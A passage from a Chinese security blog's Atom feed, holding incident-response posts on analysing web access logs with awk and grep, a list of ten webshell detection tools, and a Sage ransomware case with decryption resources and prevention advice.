class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span></span><br></pre></td></tr></table></figure><p>统计网段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span></span><br></pre></td></tr></table></figure><p>统计域名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>HTTP Status：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span></span><br></pre></td></tr></table></figure><p>URL 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>文件流量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.<span class="property">log</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.<span class="property">txt</span></span><br></pre></td></tr></table></figure><p>IP, URL 抽取：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第01章：入侵排查篇第3篇：常见的 Webshell 查杀工具</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/959c780.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/959c780.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第3篇：常见的-Webshell-查杀工具"><a href="#第3篇：常见的-Webshell-查杀工具" class="headerlink" title="第3篇：常见的 Webshell 查杀工具"></a>第3篇：常见的 Webshell 查杀工具</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p><hr><p><strong>1、D盾_Web查杀</strong></p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p><p>兼容性：只提供 Windows 版本。</p><p>工具下载地址：<a href="http://www.d99net.net">http://www.d99net.net</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-1.png" alt=""></p><p><strong>2、百度 WEBDIR+</strong></p><p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com">https://scanner.baidu.com</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-2.png" alt=""></p><p><strong>3、河马</strong></p><p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持 Windows、Linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com">https://www.shellpub.com</a></p><p><img src="./image/20200407-3.png" alt=""></p><p><strong>4、Web Shell Detector</strong></p><p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p><p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com">http://www.shelldetector.com</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector">https://github.com/emposha/PHP-Shell-Detector</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-4.png" alt=""></p><p><strong>5、CloudWalker（牧云）</strong></p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性：提供 Linux版本，Windows 暂不支持。</p><p>在线查杀 demo：<a href="https://webshellchop.chaitin.cn">https://webshellchop.chaitin.cn</a></p><p>GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-5.png" alt=""></p><p><strong>6、Sangfor WebShellKill</strong></p><p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持 Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-6.png" alt=""></p><p><strong>7、深度学习模型检测 PHP Webshell</strong></p><p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me">http://webshell.cdxy.me</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-7.png" alt=""></p><p><strong>8、PHP Malware Finder</strong></p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供Linux 版本，Windows 暂不支持。</p><p>GitHub 项目地址：<a href="https://github.com/jvoisin/php-malware-finder">https://github.com/jvoisin/php-malware-finder</a></p><p><img src="./image/20200407-8.png" alt=""></p><p><strong>9、findWebshell</strong></p><p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p><p>GitHub 项目地址：<a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-9.png" alt=""></p><p><strong>10、在线 WebShell 查杀工具</strong></p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell">http://tools.bugscaner.com/killwebshell</a></p><p><img src="https://gitee.com/eviden/img/raw/master/20200407-10.png" alt=""></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章：Windows实战篇第3篇：勒索病毒</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/df6a0bc7.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/df6a0bc7.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.059Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第3篇：勒索病毒"><a href="#第3篇：勒索病毒" class="headerlink" title="第3篇：勒索病毒"></a>第3篇：勒索病毒</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    勒索病毒，是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。自WannaCry勒索病毒在全球爆发之后，各种变种及新型勒索病毒层出不穷。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天早上，网站管理员打开OA系统，首页访问异常，显示乱码：</p><p><img src="image/win-7-1.png" alt=""></p><h3 id="0x02-事件分析"><a href="#0x02-事件分析" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p>​    登录网站服务器进行排查，在站点目录下发现所有的脚本文件及附件都被加密为.sage结尾的文件，每个文件夹下都有一个!HELP_SOS.hta文件，打包了部分样本：</p><p><img src="image/win-7-2.png" alt=""></p><p>打开!HELP_SOS.hta文件，显示如下： </p><p><img src="image/win-7-3.png" alt=""></p><p>到这里，基本可以确认是服务器中了勒索病毒，上传样本到360勒索病毒网站（<a href="http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。">http://lesuobingdu.360.cn）进行分析：确认web服务器中了sage勒索病毒，目前暂时无法解密。</a></p><p><img src="image/win-7-4.png" alt=""></p><p>绝大多数勒索病毒，是无法解密的，一旦被加密，即使支付也不一定能够获得解密密钥。在平时运维中应积极做好备份工作，数据库与源码分离（类似OA系统附件资源也很重要，也要备份）。 </p><p>遇到了，别急，试一试勒索病毒解密工具：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“拒绝勒索软件”网站</span><br><span class="line"><span class="symbol">https:</span>//www.nomoreransom<span class="meta">.org</span>/<span class="built_in">zh</span>/index.html</span><br><span class="line"><span class="number">360</span>安全卫士勒索病毒专题</span><br><span class="line"><span class="symbol">http:</span>//lesuobingdu<span class="number">.360</span>.cn</span><br></pre></td></tr></table></figure><h3 id="0x04-防范措施"><a href="#0x04-防范措施" class="headerlink" title="0x04 防范措施"></a>0x04 防范措施</h3><p>​    一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给你带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、安装杀毒软件，保持监控开启，定期全盘扫描</span><br><span class="line"><span class="attribute">2</span>、及时更新 Windows安全补丁，开启防火墙临时关闭端口，如<span class="number">445</span>、<span class="number">135</span>、<span class="number">137</span>、<span class="number">138</span>、<span class="number">139</span>、<span class="number">3389</span>等端口</span><br><span class="line"><span class="attribute">3</span>、及时更新web漏洞补丁，升级web组件</span><br><span class="line"><span class="attribute">4</span>、备份。重要的资料一定要备份，谨防资料丢失</span><br><span class="line"><span class="attribute">5</span>、强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
</feed>
